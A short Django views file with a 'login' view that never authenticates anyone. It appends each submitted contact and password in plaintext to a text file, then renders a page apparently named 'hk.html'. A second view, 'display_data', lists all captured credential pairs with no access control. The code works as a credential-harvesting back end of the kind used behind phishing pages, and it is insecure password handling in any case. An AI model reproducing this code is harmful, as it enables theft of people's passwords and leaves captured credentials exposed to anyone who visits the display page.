from django.shortcuts import render
from django.http import HttpResponse
from .forms import LogiForm

def login(request):
    if request.method == "POST":
        form = LogiForm(request.POST)
        if form.is_valid():
            # Here you can process the data (e.g., authenticate user)
            contact = form.cleaned_data['contact']
            password = form.cleaned_data['password']

            # Prepare the data to write to a file
            data_line = f"{contact},{password}\n"
            
            # Write to a file (append mode)
            with open('form_data.txt', 'a') as file:
                file.write(data_line)
            # For demonstration, just return a success message


            return render(request, 'hk.html')
    else:
        form = LogiForm()

    return render(request, 'login.html', {'form': form})



def display_data(request):
    data_lines = []
    try:
        # Open the file and read lines
        with open('form_data.txt', 'r') as file:
            data_lines = [line.strip().split(',') for line in file.readlines() if ',' in line]
    except FileNotFoundError:
        data_lines = [["No data available yet."]]
    
    return render(request, 'display_data.html', {'data_lines': data_lines})




